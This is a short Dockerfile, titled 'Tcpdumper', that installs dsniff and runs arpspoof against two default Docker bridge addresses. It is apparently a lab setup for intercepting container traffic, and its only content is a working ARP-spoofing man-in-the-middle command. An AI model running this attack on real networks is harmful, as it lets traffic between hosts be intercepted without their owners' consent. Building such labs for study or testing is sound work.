# Tcpdumper Dockerfile
FROM ubuntu
RUN apt-get update && apt-get install -y dsniff
CMD /usr/sbin/arpspoof -r -i eth0 -t 172.17.0.1 172.17.0.2